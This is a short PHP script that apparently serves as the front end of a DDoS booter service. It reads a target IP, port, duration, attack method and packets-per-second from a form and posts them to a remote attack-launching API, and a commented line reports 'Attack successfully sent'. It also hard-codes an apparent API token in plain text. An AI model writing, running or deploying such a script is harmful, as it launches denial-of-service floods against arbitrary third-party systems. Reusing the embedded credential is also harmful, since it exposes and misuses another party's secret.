<?php

 $token = $_POST["token"];
 $targetip = $_POST["ip"];
 $length = $_POST["length"];
 $port = $_POST["port"];
 $method = $_POST["method"];
 $packets = $_POST["packets"];


$token = $SLEEKTO_API_KEY;
            $base_url = "https://api.sleek.to/tests/launch";


            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => $base_url,
                CURLOPT_RETURNTRANSFER => 1,
                CURLOPT_POST => 1,
                CURLOPT_POSTFIELDS => array(
                    "token" => "WgHtpkiFrLbPY3",
                    "target" => $targetip,
                    "port" => $port,
                    "duration" => $length,
                    "method" => $method,
                    "pps" => $packets
                )
            ));


            $response = curl_exec($curl);
            curl_close($curl);
            echo "$response";
            //Echo "Attack successfully sent to $targetip for $length seconds";

            
?>